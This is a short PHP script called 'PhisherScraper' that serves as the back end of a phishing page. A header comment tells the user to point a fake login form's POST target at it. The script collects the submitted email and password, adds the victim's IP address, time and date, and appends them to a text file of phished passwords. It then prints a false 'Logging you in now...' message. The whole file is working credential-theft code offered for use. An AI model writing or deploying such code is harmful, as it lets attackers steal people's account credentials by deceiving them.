/* PhisherScraper
 processes fake login (edit generated page's POST variable to point here) 
 copyright (c) 2011 Mark Scrano mscrano@ieee.org
 version 0.1
*/
<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$timeStamp = strftime('%T');
$todayDate = date('m-d-Y');
$ipAddy = $_SERVER['REMOTE_ADDR'];

$outputFile = "phishedpasswd.txt";
$file = fopen($outputFile, 'a') or die("file cannot be opened");
$submit = "U: ".$email." P: ".$pass." IP: ".$ipAddy." T: ".$timeStamp." D: ".$todayDate."\n";
fwrite($file,$submit);
fclose($file);
echo "Logging you in now...";
?>
